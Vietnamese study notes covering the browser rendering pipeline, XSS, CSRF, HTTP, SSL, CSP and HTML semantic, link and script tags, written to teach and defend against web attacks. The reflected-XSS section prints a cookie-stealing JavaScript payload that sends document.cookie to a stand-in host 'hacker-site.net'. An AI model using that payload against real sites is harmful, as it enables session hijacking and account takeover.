# I. Critical Rendering Path.
## 1. Khái niệm.
- Là trình tự các bước Trình duyệt thực hiện để chuyển đổi các Resource (HTML, CSS và JS) thành các Pixel hiển thị lên màn hình.

- Tên gọi khác: Browser Rendering Pipeline.

## 2. Tổng quan.
- Dưới đây là mô hình tổng quan trình tự các bước browser thực hiện render.
![crpImage](https://images.viblo.asia/full/a8d1247e-c310-43e2-9e22-dca4c6c44a64.png "Critical rendering path (Browser rendering pipeline)")

1. Chuyển đổi HTML thành DOM.
2. Chuyển đổi CSS thành CSSDOM.
3. Kết hợp DOM và CSSDOM tạo thành Render Tree.
4. Từ thông tin style trên Render Tree, thực hiện tính toán vị trí và kích thước của các phần tử trong bước Layout.
5. Từ thông tin trên Render Tree và Layout, thực hiện vẽ các phần tử lên màn hình ở bước Paint.

## 3. Chi tiết.
- Trước khi trình duyệt render trang web, DOM và CSSDOM cần phải được xây dựng xong.

### 3.1. DOM.
- Đây là quá trình chuyển đổi HTML thành DOM.

- Output: Một cây các Node có chứa thông tin thuộc tính (class, id, ...) và mối quan hệ với các Node khác trên DOM.

![domImage](https://images.viblo.asia/2c09d30a-ac18-4ecb-ad82-fb0fe43fae8c.png "DOM")

### 3.2. CSSDOM.
- Đây là bước chuyển các style CSS thành CSSDOM.

- Output: Các quy tắc Style.

- Lưu ý:

1. Đây là bước độc lập với bước xây dựng DOM, chưa phải là bước xác định style cuối cùng được áp dụng lên DOM.
2. CSS ở đây có thể là các style mặc định của trình duyệt (VD: các thẻ h1, h2, b, strong, i, ...) và các CSS tự định nghĩa trong style hoặc file CSS.

![cssdomImage](https://images.viblo.asia/ba44db42-9806-41d8-bf1f-746af2e2aa1d.png "CSSDOM")

### 3.3. Render Tree.
- Đây là quá trình kết hợp DOM và CSSDOM để tạo lên Render Tree.

- Output: Một cây các Node được render và các quy tắc Style đã được tính toán cho các Node đó.

- Cây không chứa các Node ẩn mặc định (VD: các thẻ html, head, script, header, style, meta, ...) và các Node được ẩn bởi CSS (VD: display: none).

- Lưu ý: Render Tree cũng gồm tất cả visible pseudo element (VD: ::before, ::after, ...), mặc dù element này có thể không có trên DOM.

- Nói chung Render Tree chứa các Node mà người dùng nhìn thấy được trên màn hình.

![rendertreeImage](https://images.viblo.asia/006718e2-6bc0-43d8-b146-fdd820d2f60b.png "Render Tree")

### 3.4. Layout.
- Là quá trình tính toán kích thước, vị trí của các phần tử trên browser. Layout còn có tên khác là Reflow.

- Output: Box model

![layoutImage](https://images.viblo.asia/f5d22828-b7fc-4a93-8084-31b9b8c1ea2f.png "Layout")

### 3.5. Paint.
- Từ các thông tin Style trên Render Tree và thông tin kích thước, vị trí từ Layout, trình duyệt thực hiện vẽ các pixel lên màn hình, đây chính là giao diện mà người dùng nhìn thấy.

### 3.6. Composite.
- Thực tế ngoài 5 bước chính, sẽ có thêm một quá trình có tên là Composite. Quá trình này có nhiệm vụ xác định số lượng layer và gom tất cả các layer để hiển thị lên màn hình.

# II. XSS.
## 1. Khái niệm.
- XSS là tên viết tắt của Cross-site scripting. Đây là một hình thức tấn công bằng mã độc phổ biến. Các hacker sẽ lợi dụng lỗ hổng trong bảo mật web để chèn các mã script, sau đó gửi cho người dùng để truy cập và mạo danh người dùng.

- Mục đích của việc này chính là ăn cắp dữ liệu nhận dạng của người dùng như session tokens, cookies và các thông tin khác.

- Tấn công XSS là hình thức tấn công đơn giản nhưng đặc biệt nguy hiểm. Đây cũng là kỹ thuật được hacker sử dụng phổ biến nhất trong thời điểm hiện nay.

## 2. Cách XSS hoạt động.
- Tấn công XSS nghĩa là gửi chèn lệnh và script độc hại, những mã đôc hại này thường được viết bằng các ngôn ngữ lập trình phía client như JavaScript, VBScript, Flash, HTML,… Tuy nhiên, cách tấn công này thường sử dụng JavaScript và HTML.

- XSS hoạt động bằng cách điều khiển một trang web dễ bị tấn công để trả về JavaScript độc hại cho người dùng. Khi mã độc thực thi bên trong trình duyệt, hacker hoàn toàn có thể xâm nhập vào tài khoản và sử dụng dữ liệu của người dùng.

![XSSImage](https://ssl.vn/wp-content/uploads/2019/09/xss.png "XSS")

## 3. Các loại XSS.
### 3.1. Reflected XSS.
- Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một trong những cách được biết đến nhiều nhất là chiếm phiên làm việc (session) của người dùng, từ đó có thể truy cập được dữ liệu và chiếm được quyền của họ trên website. Chi tiết được mô tả qua những bước sau:
![ReflectedXSSImage](https://images.viblo.asia/28e81cf8-c006-4835-9ef0-a8df7d2ccd12.jpg "ReflectedXSS")

1. Người dùng đăng nhập web và giả sử được gán session:
Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4

2. Bằng cách nào đó, hacker gửi được cho người dùng URL:
http://example.com/name=var+i=new+Image;+i.src=”http://hacker-site.net/”%2Bdocument.cookie;

Giả sử example.com là website nạn nhân truy cập, hacker-site.net là trang của hacker tạo ra

3. Nạn nhân truy cập đến URL trên

4. Server phản hồi cho nạn nhân, kèm với dữ liệu có trong request (đoạn javascript của hacker)

5. Trình duyệt nạn nhân nhận phản hồi và thực thi đoạn javascript

6. Đoạn javascript mà hacker tạo ra thực tế như sau:

var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;

Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng:

GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4 HTTP/1.1

Host: hacker-site.net

7. Từ phía site của mình, hacker sẽ bắt được nội dung request trên và coi như session của người dùng sẽ bị chiếm. Đến lúc này, hacker có thể giả mạo với tư cách nạn nhân và thực hiện mọi quyền trên website mà nạn nhân có.

### 3.2. Stored XSS.
- Stored XSS khác với Reflected XSS, hình thức này nhắm đến nhiều nạn nhân cùng lúc. Đây là nơi script độc hại đến từ cơ sở dữ liệu của trang web. Hacker chèn các mã độc vào cơ sở dữ liệu thông qua các dữ liệu đầu vào như input, form,… Khi người dùng truy cập và tiến hành những thao tác liên quan đến dữ liệu đã lưu thì mã độc sẽ lập tức hoạt động trên trình duyệt.

![StoredXSSImage](https://static.vietnix.vn/wp-content/uploads/2022/03/stored-xss.webp "StoredXSS")

### 3.3. DOM-based XSS.
- DOM-based XSS là nơi lỗ hổng bảo mật tồn tại trong mã phía client chứ không phải mã phía server. Hình thức này dùng để khai thác XSS dựa vào việc thay đổi HTML của tài liệu, hay nói cách khác là thay đổi cấu trúc DOM.

## 4. XSS có thể làm gì?
- Hacker khai thác lỗ hổng XSS trên nhiều trang web thường có thể:
    - Mạo danh hoặc giả dạng người dùng của nạn nhân.
    - Thực hiện bất kỳ hành động nào mà người dùng có thể thực hiện.
    - Đọc bất kỳ dữ liệu nào mà người dùng có thể truy cập.
    - Nắm bắt thông tin đăng nhập của người dùng.
    - Thực hiện thay đổi bề mặt ảo của trang web.
    - Chèn trojan độc hại vào trang web.

## 5. Cách ngăn chặn tấn công XSS.
- Kiểu tấn công này là một trong những kiểu tấn công có nhiều nguy hiểm và rủi ro nhất. Tuy nhiên, vẫn có rất nhiều cách để ngăn chặn tấn công này. Phương pháp ngăn chặn tấn công XSS bao gồm:

    - Data validation.
    - Filtering.
    - Escaping.
- Bước đầu tiên trong việc ngăn chặn cuộc tấn công này là Input validation (Xác thực đầu vào). Mọi thứ do người dùng nhập phải được xác thực chính xác vì thông tin input của người dùng có thể tìm đường đến output. Data validation (Xác thực dữ liệu) có thể được đặt tên là cơ sở để đảm bảo tính bảo mật của hệ thống.

- Trên thực tế, việc này chỉ giúp giảm thiểu rủi ro, và có thể không đủ để ngăn chặn tấn công XSS có thể xảy ra.

- Một phương pháp ngăn chặn tốt hơn là lọc input filtering (thông tin đầu vào) của người dùng. Ý tưởng của bộ lọc là tìm kiếm các từ khóa gây rủi ro trong thông tin input của người dùng và xóa chúng hoặc thay thế chúng bằng các chuỗi trống. Những từ khóa đó có thể là:

    - <script></script> tags.
    - Javascript commands.
    - HTML markup.
- Input filtering cũng là một phương pháp khá dễ thực hiện.

- Còn một phương pháp ngăn chặn có thể thực hiện là phương pháp characters escaping. Trong phương pháp này, các ký tự thích hợp đang được thay đổi bằng các code đặc biệt. Ví dụ: Ký tự escaping có thể trông giống như &#60.

# III. CSRF.
## 1. Khái niệm.
- CSRF ( Cross Site Request Forgery) là kỹ thuật tấn công bằng cách sử dụng quyền chứng thực của người dùng đối với một website. CSRF là kỹ thuật tấn công vào người dùng, dựa vào đó hacker có thể thực thi những thao tác phải yêu cầu sự chứng thực. Hiểu một cách nôm na, đây là kỹ thuật tấn công dựa vào mượn quyền trái phép.

- CSRF còn được gọi là "session riding", "XSRF".

## 2. Cách thức hoạt động.
- CSRF là một kiểu tấn công gây sự nhầm lẫn tăng tính xác thực và cấp quyền của nạn nhân khi gửi một request giả mạo đến máy chủ. Vì thế một lỗ hổng CSRF ảnh hưởng đến các quyền của người dùng ví dụ như quản trị viên, kết quả là chúng truy cập được đầy đủ quyền.

- Khi gửi một request HTTP, trình duyệt của nạn nhân sẽ nhận về Cookie. Các cookie thường được dùng để lưu trữ một session (Đọc thêm bài Session là gì? để hiểu thêm cách hoạt động của Session và cookies) để định danh người dùng không phải xác thực lại cho mỗi yêu cầu gửi lên.

- Nếu phiên làm việc đã xác thực của nạn nhân được lưu trữ trong một Cookie vẫn còn hiệu lực, và nếu ứng dụng không bảo mật dễ bị tấn công CSRF. Kẻ tấn công có thể thử dụng CSRF để chạy bất cứ requets nào với ứng dụng web mà ngay cả trang web không thể phân biệt được request nào là thực hay giả mạo.

- Ví dụ để hiểu rõ hơn, khi ứng dụng web có một chức năng đơn giản đó là thay đổi mật khẩu người dùng. Việc gửi lên server theo phương thức HTTP GET thông thường. Nội dung gửi lên là password mới và confirm lại password vừa nhập:

- Người dùng đã đăng nhập trên web của bạn, cookie sẽ được tạo và lưu trữ dưới trình duyệt, khi bạn vào site lần sau bạn không cần phải đăng nhập lại. Giả sử bạn chưa đăng thoát, lúc này cookies của bạn vẫn còn hạn trong phiên làm việc.
Lúc này nếu website của bạn mắc lỗi CSRF, người dùng vô tình vào một trang hacker giả mạo với mục đích lấy tài khoản từ ứng dụng web của bạn. Trong trang giả mạo hacker sẽ dùng script để chạy một url để cố ý reset mật khẩu người dùng trên trang của bạn.

- Như vậy khi Victim (User) vô tình vào trang web-hacker-gia-mao .com đã reset password của bản thân tại trang website-cua-ban .com. Hacker nếu biết thông tin username sẽ thử vào với password đã cài đặt:hacked và có thể vào một cách bình thường.

## 3. Cách phòng chống tấn công CSRF.
### 3.1. Phía User.
- Nên đăng xuất khỏi các website quan trọng: Tài khoản ngân hàng, thanh toán trực tuyến, các mạng xã hội, gmail… khi đã thực hiện xong giao dịch.

- Nên login vào một máy riêng và không cho người thứ 2 tiếp xúc với máy đó.

- Không nên click vào các đường dẫn mà bạn nhận được qua email, qua facebook … Khi bạn đưa chuột qua 1 đường dẫn, phía dưới bên trái của trình duyệt thường có địa chỉ website đích, bạn nên lưu ý để đến đúng trang mình muốn.

- Không lưu các thông tin về mật khẩu tại trình duyệt của mình. Không nên chọn các phương thức “đăng nhập lần sau”, “lưu mật khẩu...

- Trong quá trình thực hiện giao dịch hay vào các website quan trọng không nên vào các website khác, có thể chứa các mã khai thác của kẻ tấn công.

### 3.2. Phía Server.
- Sử dụng captcha, các thông báo xác nhận: Captcha được sử dụng để nhận biết đối tượng đang thao tác với hệ thống là con người hay không. Các thao tác quan trọng như “đăng nhập” hay là “chuyển khoản” ,”thanh toán” thường là hay sử dụng captcha. Những chức năng quan trọng như reset mật khẩu, xác nhận thay đổi info của account cũng nên gửi url qua email đã đăng ký để người dùng có thể click vào xác nhận.

- Sử dụng csrf_token: token này sẽ thay đổi liên tục trong phiên làm việc, và khi thay đổi thông tin gửi kèm thông tin token này. Nếu token được sinh ra và token được gửi lên ko trùng nhau thì loại bỏ request.

- Sử dụng cookie riêng biệt cho trang admin: Nên để trang quản trị ở một subdomain riêng để chúng không dùng chung cookies với front end của sản phẩm. Ví dụ nên đặt là admin.topdev.vn hay hơn là topdev.vn/admin.

- Kiểm tra IP: Một số hệ thống quan trọng chỉ cho truy cập từ những IP được thiết lập sẵn, hoặc chỉ cấp phép truy cập quản trị qua IP local hoặc VPN.

# IV. HTTP
## 1. Khái niệm.
- HTTP là từ viết tắt của Hyper Text Transfer Protocol nghĩa là Giao thức Truyền tải Siêu Văn Bản được sử dụng trong www. HTTP là 1 giao thức cho phép tìm nạp tài nguyên, chẳng hạn như HTML doc.

- Nó là nền tảng của bất kỳ sự trao đổi dữ liệu nào trên Web và cũng là giao thức giữa client (thường là các trình duyệt hay bất kỳ loại thiết bị, chương trình nào) và server (thường là các máy tính trên đám mây). 1 doc hoàn chỉnh được tái tạo từ các doc con khác nhau được fetch – tìm nạp, chẳng hạn như văn bản, mô tả layout, hình ảnh, video, script v..v..

## 2. Cấu trúc cơ bản của HTTP.
- HTTP là một giao thức Yêu cầu - Phản hồi được xây dựng dựa trên cấu trúc Client - Server. Vậy cách vận hành HTTP như thế nào? Trong cấu trúc này, Client và Server giao tiếp bằng cách trao đổi các message độc lập, thay vì sử dụng một luồng dữ liệu duy nhất.

- Đầu tiên, Client sẽ gửi một message đến Server, thường là những yêu cầu có lợi khiến Client truy cập website này. Sau khi tiếp nhận các yêu cầu và xử lý, Server sẽ gửi trả một message, được gọi là phản hồi. Mỗi một phản hồi đều độc lập, phản hồi sau sẽ không chịu bất kỳ tác động nào từ phản hồi trước.

## 3. Đặc điểm của HTTP.
- __Thiết kế đơn giản:__
    - Giao thức HTTP thường được thiết kế với sự đơn giản và thân thiện đối với người đọc, ngay cả khi có thêm sự phức tạp được tích hợp trong HTTP/2 thông qua việc đóng gói các HTTP message thành các frame.

    - Với HTTP message, việc đọc và hiểu các thông điệp trở nên dễ dàng, cung cấp khả năng kiểm thử cao hơn cho các nhà phát triển và giảm thiểu độ phức tạp đối với người mới sử dụng.

- __Khả năng mở rộng:__
    - Tính năng header HTTP đã được giới thiệu trong HTTP/1.0 đã tạo điều kiện thuận lợi cho việc mở rộng và thử nghiệm giao thức. Các chức năng mới có thể dễ dàng được giới thiệu bằng một thỏa thuận thống nhất giữa client và máy chủ về ý nghĩa của một header mới.

- __HTTP là stateless, nhưng không sessionless:__
    - Mọi phản hồi của HTTP là độc lập nên không có liên kết giữa hai yêu cầu được thực hiện liên tiếp trên cùng một kết nối. Điều này có thể sẽ trở thành một nhược điểm đối với những trường hợp người dùng cần tương tác với các trang nhất định một cách mạch lạc, ví dụ như việc sử dụng shopping cart trên các trang thương mại điện tử.

    - Để khắc phục vấn đề này, HTTP cho phép sử dụng cookie HTTP nhờ vào khả năng mở rộng tự do các header. Người dùng có thể tự tạo session trên mỗi yêu cầu HTTP để chia sẻ cùng một ngữ cảnh hoặc trạng thái. Sở dĩ trường hợp này có thể thực hiện được vì cốt lõi bản thân HTTP là stateless.

# V. SSL.
## 1. Khái niệm.
- SSL là viết tắt của Secure Sockets Layer, một công nghệ tiêu chuẩn cho phép thiết lập kết nối được mã hóa an toàn giữa máy chủ web (host) và trình duyệt web (client).

- Kết nối này đảm bảo rằng dữ liệu được truyền giữa host và client được duy trì một cách riêng tư, đáng tin cậy. SSL hiện đã được sử dụng bởi hàng triệu trang web để bảo vệ các giao dịch trực tuyến của họ với khách hàng.

## 2. Tầm quan trọng của SSL.
### 2.1. SSL mã hóa thông tin nhạy cảm.
- SSL giữ cho những thông tin nhạy cảm được mã hóa khi gửi qua Internet và chỉ có những người nhận được chỉ định mới có thể hiểu nó.

### 2.2. SSL cung cấp tính xác thực.
- Ngoài mã hóa, một chứng nhận SSL thích hợp cũng cung cấp sự xác thực. Điều này có nghĩa là bạn có thể chắc chắn rằng mình đang gửi thông tin đến đúng máy chủ chứ không phải đến một kẻ mạo danh nào đó đang cố gắng ăn cắp thông tin của bạn.

### 2.3. SSL cung cấp sự tin cậy.
- Các trình duyệt web sẽ cung cấp cho người dùng những tín hiệu để biết rằng kết nối của mình đang được đảm bảo, đó có thể là một biểu tượng khóa hoặc một thanh màu xanh lá cây. Nhờ đó, khách hàng sẽ tin tưởng trang web hơn và tăng khả năng mua hàng, gắn bó với website. Nhà cung cấp SSL cũng sẽ cung cấp cho bạn một dấu hiệu tin cậy để làm cho khách hàng tin tưởng hơn nữa.

### 2.4. SSL mang đến sự tin cậy cho người truy cập.
- HTTPS cũng giúp chống lại những cuộc tấn công lừa đảo. Một email lừa đảo là email được gửi từ tên tội phạm đang cố gắng mạo danh trang web của bạn.

### 2.5. SSL được yêu cầu cho PCI Compliance.
- Để chấp nhận thông tin thẻ tín dụng trên website, bạn phải vượt qua những cuộc kiểm tra để chứng minh rằng bạn đang tuân thủ các tiêu chuẩn thanh toán bằng thẻ - Payment Card Industry, PCI. Một trong những yêu cầu đó là sử dụng SSL Certificate.

### 2.6. SSL đối với SEO.
- Google đã đưa ra thông báo rằng HTTPS sẽ là một tiêu chí để xếp hạng website. Nghĩa là khi đưa ra kết quả cho người tìm kiếm, trang web có SSL sẽ được ưu tiên hơn trang web cùng loại nhưng không có SSL.

# VI. CSP.
## 1. CSP là gì?
- CSP (Content Security Policy) là một lớp bảo mật được thêm vào mục đích để phát hiện và ngăn chặn một số loại tấn công thường gặp, bao gồm cả cuộc tấn công XSS (Cross Site Scripting) và tấn công data injection.

- CSP là tập hợp một danh sách an toàn (whitelist) những domain hay kiểu script, style, image, frame mà trình duyệt được load trên website của chúng ta. Điều này đảm bảo chỉ có những script, style, image, frame được chúng ta chỉ định có thể được tải, những request không nằm trong whitelist sẽ bị chặn ngay tức khắc.

## 2. Cách hoạt động CSP.
- SP (hay Content-Security-Policy) thực chất là một header nằm trên request khi được gửi đến một server nào đó.

- Để enable CSP, chúng ta chỉ cần cấu hình cho server của chúng ta trả về Content-Security-Policy HTTP headers.

- Để xem danh sách các thẻ policy đầy đủ bạn có thể xem tại Content-Security-Policy header

- Một cách khác chúng ta có thể sử dụng thông qua thẻ <meta>. Ví dụ: <meta http-equiv=”Content-Security-Policy” content=”default-src ‘self’; img-src https://*; child-src ‘none’;”>

## 3. Lợi ích của CSP.
- Giảm thiểu tối đa nguy cơ tấn công XSS.
    - CSP được xem là một trong các công cụ chống lại XSS một cách mạnh mẽ. CSP chỉ cho phép trình duyệt giới hạn cách thức và những danh sách JavaScript được thực thi trong trang.

- Giúp việc thực thi HTTPs dễ dàng hơn.
    - Sử dụng HTTPs giúp mọi dữ liệu truyền và nhận giữa máy tính của người dùng và server đều được mã hóa. Điều này khiến cho các hacker, tin tặc không thể đọc hay chỉnh sửa những dữ liệu đó. Tăng cường bảo mật CSP giúp bạn thực thi giao thức HTTPs dễ dàng với hiệu quả cao hơn.

- Ngăn ngừa website thu thập sai dữ liệu.
    - Khi bật CSP trang web sẽ an toàn hơn nhờ việc được chặn các kết nối, tập lệnh, phông chữ cùng các loại tài nguyên độc hại hoặc không xác định được nguồn gốc.

# VII. Semantic.
## 1. Khái niệm.
- Thẻ Semantic trong HTML giúp mô tả rõ ràng ý nghĩa riêng của thẻ đó đối với các trình duyệt và lập trình viên. Để hiểu rõ hơn, bạn có thể hình dung rằng nếu chỉ cần đọc tên các thẻ này, bạn đã có thể hiểu được nội dung bên trong element này nói về cái gì.

- Một số ví dụ về thẻ semantic (thẻ có ý nghĩa) như: <a>, <form>, <table>, <img>,… Những thẻ này đều mô tả rõ ràng về nội dung bên trong nó.

- Ví dụ về thẻ non – semantic (thẻ không có ý nghĩa): <div>, <span>,… Những thẻ này không mô tả rõ ràng về nội dung bên trong nó. Nếu chỉ nhìn vào chính element đó thì bạn sẽ không thể hiểu được nội dung của nó nói về cái gì.

## 2. Ý nghĩa của thẻ Semantic trong HTML5.
- Thông thường, lập trình viên và các công cụ tìm kiếm là những đối tượng có liên quan đến thẻ HTML. 

- Đối với công cụ tìm kiếm, các thẻ semantic giúp tăng hiệu quả tiếp cận người dùng: Công cụ tìm kiếm thường thích đọc những trang web có sử dụng semantic tags. Như ở phần trên có nói đến, chỉ cần đọc tên thẻ là bạn có thể nắm được thông tin cần thiết về nội dung mà nó thể hiện. Chính điều này đã giúp tăng khả năng phân loại nội dung, dẫn đến quá trình trải nghiệm của người dùng trên web cũng trở nên dễ dàng và tiện lợi hơn. Từ đó, trang web của bạn cũng được đánh giá cao. 

- Đối với lập trình viên, thẻ semantic mang đến tính năng về giao diện tối giản và dễ quan sát: Khi mở mã nguồn của trang web, các lập trình viên có thể nhanh chóng tìm ra từng mục khác nhau dựa vào các thẻ semantic. Điều này sẽ giúp họ tìm ra cấu trúc trang web một cách dễ dàng hơn. Đặc biệt, nếu muốn thực hiện thay đổi hoặc thêm thành phần nào đó, họ có thể thực hiện nó chính xác và dễ dàng hơn. 

## 3. Các Semantic tags trong HTML5.
### 3.1. Thẻ <section> trong HTML5.
- Trong các trang web thường có mỗi phần khác nhau như phần giới thiệu, nội dung,… mục đích của thẻ <section> là dùng để chứa và phân biệt những phần đó. 

- Bạn cần lưu ý rằng: thẻ <section> không tạo ra ý nghĩa cho nội dung bên trong nó mà đơn giản chỉ để phân biệt giữa các thành phần khác nhau của trang HTML. Hiểu một cách đơn giản, <section> giống như một container chứa hàng và bạn có thể để bất cứ loại hàng nào bên trong nó.

- Cấu trúc thẻ: __<section></section>__.

### 3.2. Thẻ <article> trong HTML5.
- Bạn có thể hình dung một trang Web tổng hợp rất nhiều thông tin. Những thông tin đó đều có sự liên kết với nhau. Trong số đó có những thông tin có thể tồn tại riêng biệt và nó được chứa trong thẻ article.

- Như vậy, thẻ article thường được dùng để định nghĩa một bài viết hay một nội dung độc lập. Thẻ này được sử dụng trong các bài viết, tin tức, nội dung quảng cáo,…

- Cấu trúc: __<article></article>__.

### 3.3. Thẻ <header> trong HTML5.
- Thẻ header được sử dụng để xác định phần đầu của một trang hay một đoạn tài liệu. Nó còn được dùng cho phần giới thiệu hay chứa các thành phần chuyển hướng (hay navigation). Trong cùng một tài liệu, bạn có thể sử dụng một hoặc nhiều phần tử header.

- Cấu trúc: __<header></header>__.

### 3.4. Thẻ <footer> trong HTML5.
- Thẻ footer được dùng để xác định phần kết thúc của một trang Web hay một đoạn bất kỳ. Nó còn được xem là phần tóm lược toàn phần nội dung trước đó. Semantic tags này thường chứa những thông tin liên lạc, thông tin của tác giả, các tài liệu có liên quan,… Tương tự như trên, bạn cũng có thể áp dụng một hoặc nhiều thẻ footer trong một tài liệu.

- Cấu trúc của thẻ: __<footer></footer>__.

### 3.5. Thẻ <nav> trong HTML5.
- Thẻ nav được dùng để định nghĩa một tập các liên kết điều hướng trong trang (navigation). Người ta thường sử dụng tag này cho global menu, local link, pager link,… Một lưu ý nhỏ ở đây là: thẻ nàv được dùng cho lượng lớn các link điều hướng nhưng không phải tất cả các link này trong tài liệu cần đặt trong thẻ.

- Cấu trúc thẻ: __<nav></nav>__.

### 3.6. Thẻ <aside> trong HTML5.
- Tag aside để xác định những nội dung nằm bên ngoài nội dung chính (được gọi là phần sidebar). Những thông tin này thường được hiểu là nội dung bổ trợ cho nội dung chính, có hay không cũng không làm ảnh hưởng đến chất lượng nội dung chính.

- Lưu ý: Thẻ aside nên có nội dung liên quan đến phần nội dung chính và nó có thể chứa tất cả các thẻ định dạng khác.

- Cấu trúc: __<aside></aside>__.

### 3.7. Thẻ <figure> và <figcaption> trong HTML5.
- Thẻ figure để xác định các nội dung liên quan với nhau, bao gồm hình ảnh, sơ đồ, mã code,… Nội dung của thẻ này nên liên quan đến nội dung chính và thường sử dụng chung với figcaption để chỉ một chú thích.

- Như vậy, thẻ figcaption được dùng để làm chú thích cho nội dung được đặt bên trong figure, nó có thể đặt ở vị trí trên hoặc dưới thẻ figure.

- Cấu trúc: 
    __<figure>__
    __<figcaption></figcaption>__
    __<figure>__

# VIII. Link & Script tag.
## 1. Khái niệm.
- Các thẻ <link> và <script> là các phần tử thiết yếu trong phần <head> của tài liệu HTML.  Chúng phục vụ nhiều mục đích khác nhau, như liên kết các tệp stylesheet bên ngoài hoặc bao gồm các tệp JavaScript.

## 2. <link> Tag.
- Thẻ <link> thường được sử dụng để liên kết các bảng kiểu bên ngoài với tài liệu HTML.  Đó là một thẻ tự đóng, có nghĩa là nó không cần thẻ đóng.

- Syntax: <link>

- Attributes:

| **Attribute**      | **Value**                                      | **Description**                                                                                  |
|--------------------|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| `crossorigin`      | `anonymous`, `use-credentials`                 | Specifies how the element handles cross-origin requests.                                         |
| `href`             | `URL`                                          | Specifies the location of the linked document.                                                   |
| `hreflang`         | `language_code`                                | Specifies the language of the text in the linked document.                                       |
| `media`            | `media_query`                                  | Specifies on what device the linked document will be displayed.                                  |
| `referrerpolicy`   | `no-referrer`, `no-referrer-when-downgrade`, `origin`, `origin-when-cross-origin`, `unsafe-url` | Specifies which referrer to use when fetching the resource.                                      |
| `rel`              | `alternate`, `author`, `dns-prefetch`, `help`, `icon`, `license`, `next`, `pingback`, `preconnect`, `prefetch`, `preload`, `prerender`, `prev`, `search`, `stylesheet` | Specifies the relationship between the current document and the linked document.               |
| `sizes`            | `HeightxWidth`, `any`                          | Specifies the size of the linked resource. Only for `rel="icon"`.                                |
| `title`            | -                                              | Defines a preferred or an alternate stylesheet.                                                  |
| `type`             | `media_type`                                   | Specifies the media type of the linked document.                                                 |


## 3. <script> Tag.
- Thẻ <script> được sử dụng để bao gồm mã hoặc tệp JavaScript trong tài liệu HTML.  Khác với thẻ <link>, thẻ <script> phải được đóng bằng thẻ </script>.

- Syntax: <script></script>

- Attributes: 

| **Attribute**      | **Value**                                      | **Description**                                                                                             |
|--------------------|------------------------------------------------|-------------------------------------------------------------------------------------------------------------|
| `async`            | `async`                                        | Specifies that the script is downloaded in parallel to parsing the page, and executed as soon as it is available (before parsing completes) (only for external scripts). |
| `crossorigin`      | `anonymous`, `use-credentials`                 | Sets the mode of the request to an HTTP CORS Request.                                                        |
| `defer`            | `defer`                                        | Specifies that the script is downloaded in parallel to parsing the page, and executed after the page has finished parsing (only for external scripts).                |
| `integrity`        | `filehash`                                     | Allows a browser to check the fetched script to ensure that the code is never loaded if the source has been manipulated. |
| `nomodule`         | `True`, `False`                                | Specifies that the script should not be executed in browsers supporting ES2015 modules.                       |
| `referrerpolicy`   | `no-referrer`, `no-referrer-when-downgrade`, `origin`, `origin-when-cross-origin`, `same-origin`, `strict-origin`, `strict-origin-when-cross-origin`, `unsafe-url` | Specifies which referrer information to send when fetching a script.                                           |
| `src`              | `URL`                                          | Specifies the URL of an external script file.                                                                |
| `type`             | `scripttype`                                   | Specifies the media type of the script.                                                                      |